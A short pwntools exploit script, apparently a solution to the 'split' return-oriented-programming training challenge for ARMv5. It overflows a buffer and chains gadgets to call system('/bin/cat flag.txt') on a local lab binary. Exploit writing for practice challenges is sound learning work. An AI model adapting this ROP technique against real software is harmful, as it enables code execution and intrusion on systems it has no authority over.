#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF('./split_armv5')

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
continue
'''.format(**locals())

# -- Exploit goes here --

io = start()
io.recvuntil("data...\n")
payload = (
    b"A" * 36 +
    p32(0x10660) + # : pop {r3, r4, r5, r6, r7, r8, sb, pc}
    p32(0x103C8) + # plt system
    p32(0x0) * 3 +
    p32(0x20810) + # /bin/cat flag.txt
    p32(0x0) * 2 +
    p32(0x10648) # : mov r0, r7; mov r1, r8; mov r2, sb; blx r3;
)
io.sendline(payload)

io.interactive()

